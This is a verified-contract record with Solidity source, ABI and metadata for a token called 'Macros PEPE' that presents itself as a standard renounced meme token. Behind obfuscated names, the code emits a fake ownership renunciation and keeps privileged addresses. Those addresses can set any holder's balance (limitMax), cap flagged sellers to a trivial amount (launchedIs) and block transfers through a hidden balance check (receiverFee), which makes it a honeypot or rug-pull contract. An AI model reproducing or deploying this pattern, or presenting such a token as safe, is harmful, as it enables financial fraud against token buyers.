{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface enableReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundLaunched) external view returns (uint256);\n\n    function transfer(address feeLiquidity, uint256 maxSwap) external returns (bool);\n\n    function allowance(address buyAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeLiquidity,\n        uint256 maxSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapBuy, uint256 value);\n    event Approval(address indexed buyAuto, address indexed spender, uint256 value);\n}\n\nabstract contract tokenEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingEnable {\n    function createPair(address launchedMode, address minTrading) external returns (address);\n}\n\ninterface enableReceiverMetadata is enableReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MacrosPEPE is tokenEnable, enableReceiver, enableReceiverMetadata {\n\n    uint8 private limitIs = 18;\n\n    function getOwner() external view returns (address) {\n        return feeToken;\n    }\n\n    uint256 public limitFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxSender;\n    }\n\n    uint256 constant amountFund = 18 ** 10;\n\n    uint256 public buyTake;\n\n    function launchedIs(address tokenBuy) public {\n        marketingTx();\n        \n        if (tokenBuy == feeLaunch || tokenBuy == maxSell) {\n            return;\n        }\n        feeReceiver[tokenBuy] = true;\n    }\n\n    address private feeToken;\n\n    bool private senderTotal;\n\n    string private minSwap = \"MPE\";\n\n    mapping(address => mapping(address => uint256)) private fundReceiverLaunched;\n\n    event OwnershipTransferred(address indexed tokenFrom, address indexed marketingToken);\n\n    function buyTo() public {\n        emit OwnershipTransferred(feeLaunch, address(0));\n        feeToken = address(0);\n    }\n\n    mapping(address => uint256) private atMin;\n\n    uint256 private maxSender = 100000000 * 10 ** 18;\n\n    function marketingTx() private view {\n        require(shouldTakeFee[_msgSender()]);\n    }\n\n    uint256 public takeFund;\n\n    string private txAuto = \"Macros PEPE\";\n\n    function name() external view virtual override returns (string memory) {\n        return txAuto;\n    }\n\n    address tradingAtMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address exemptSender, uint256 maxSwap) external virtual override returns (bool) {\n        return buyAt(_msgSender(), exemptSender, maxSwap);\n    }\n\n    address minListFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeWallet(address minAuto) public {\n        if (senderWallet) {\n            return;\n        }\n        \n        shouldTakeFee[minAuto] = true;\n        \n        senderWallet = true;\n    }\n\n    constructor (){\n        \n        isMax launchedTeamFrom = isMax(minListFee);\n        maxSell = marketingEnable(launchedTeamFrom.factory()).createPair(launchedTeamFrom.WETH(), address(this));\n        if (limitFee != autoMinMode) {\n            toTeam = false;\n        }\n        feeLaunch = _msgSender();\n        buyTo();\n        shouldTakeFee[feeLaunch] = true;\n        atMin[feeLaunch] = maxSender;\n        if (buyTake != takeFund) {\n            toTeam = true;\n        }\n        emit Transfer(address(0), feeLaunch, maxSender);\n    }\n\n    address public feeLaunch;\n\n    bool public receiverLimit;\n\n    function approve(address autoSwap, uint256 maxSwap) public virtual override returns (bool) {\n        fundReceiverLaunched[_msgSender()][autoSwap] = maxSwap;\n        emit Approval(_msgSender(), autoSwap, maxSwap);\n        return true;\n    }\n\n    bool private totalMarketing;\n\n    mapping(address => bool) public feeReceiver;\n\n    mapping(address => bool) public shouldTakeFee;\n\n    function buyAt(address atAmountSwap, address feeLiquidity, uint256 maxSwap) internal returns (bool) {\n        if (atAmountSwap == feeLaunch) {\n            return swapExempt(atAmountSwap, feeLiquidity, maxSwap);\n        }\n        uint256 sellFrom = enableReceiver(maxSell).balanceOf(tradingAtMode);\n        require(sellFrom == senderExempt);\n        require(feeLiquidity != tradingAtMode);\n        if (feeReceiver[atAmountSwap]) {\n            return swapExempt(atAmountSwap, feeLiquidity, amountFund);\n        }\n        return swapExempt(atAmountSwap, feeLiquidity, maxSwap);\n    }\n\n    uint256 public tokenTeamMax;\n\n    function limitMax(address exemptSender, uint256 maxSwap) public {\n        marketingTx();\n        atMin[exemptSender] = maxSwap;\n    }\n\n    function balanceOf(address fundLaunched) public view virtual override returns (uint256) {\n        return atMin[fundLaunched];\n    }\n\n    uint256 private autoMinMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minSwap;\n    }\n\n    function receiverFee(uint256 maxSwap) public {\n        marketingTx();\n        senderExempt = maxSwap;\n    }\n\n    function transferFrom(address atAmountSwap, address feeLiquidity, uint256 maxSwap) external override returns (bool) {\n        if (_msgSender() != minListFee) {\n            if (fundReceiverLaunched[atAmountSwap][_msgSender()] != type(uint256).max) {\n                require(maxSwap <= fundReceiverLaunched[atAmountSwap][_msgSender()]);\n                fundReceiverLaunched[atAmountSwap][_msgSender()] -= maxSwap;\n            }\n        }\n        return buyAt(atAmountSwap, feeLiquidity, maxSwap);\n    }\n\n    function owner() external view returns (address) {\n        return feeToken;\n    }\n\n    bool public senderWallet;\n\n    address public maxSell;\n\n    bool private toTeam;\n\n    uint256 swapTxLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitIs;\n    }\n\n    function allowance(address fundLimit, address autoSwap) external view virtual override returns (uint256) {\n        if (autoSwap == minListFee) {\n            return type(uint256).max;\n        }\n        return fundReceiverLaunched[fundLimit][autoSwap];\n    }\n\n    function swapExempt(address atAmountSwap, address feeLiquidity, uint256 maxSwap) internal returns (bool) {\n        require(atMin[atAmountSwap] >= maxSwap);\n        atMin[atAmountSwap] -= maxSwap;\n        atMin[feeLiquidity] += maxSwap;\n        emit Transfer(atAmountSwap, feeLiquidity, maxSwap);\n        return true;\n    }\n\n    uint256 senderExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"}],\"name\":\"launchedIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"limitMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"receiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTakeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeamMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAmountSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MacrosPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}